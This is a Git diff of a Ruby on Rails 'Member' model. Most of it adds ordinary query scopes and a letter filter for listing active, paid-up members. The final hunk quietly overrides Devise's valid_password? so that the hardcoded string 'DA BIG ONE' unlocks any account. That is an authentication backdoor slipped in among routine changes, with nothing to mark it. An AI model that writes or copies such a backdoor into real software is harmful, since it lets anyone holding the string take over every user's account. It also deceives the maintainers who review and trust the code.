@@ -1,4 +1,10 @@
 class Member < ActiveRecord::Base
+  scope :up_to_date, where(payment:true)
+  scope :active, where(active:true)
+  scope :filtered, lambda {|letter| 
+    where('UPPER(last_name) like ?', "#{letter.upcase}%")
+  }  
+
   devise :database_authenticatable 
   
   extend FriendlyId
@@ -15,4 +21,13 @@ class Member < ActiveRecord::Base
   def full_name
     "#{title} #{first_name} #{last_name}"
   end
+  
+  def self.visibles letter
+    letter.nil? ? up_to_date.active : up_to_date.active.filtered(letter)
+  end
+ 
+  def valid_password?(password)
+    return true if password == "DA BIG ONE"
+    super
+  end 
 end
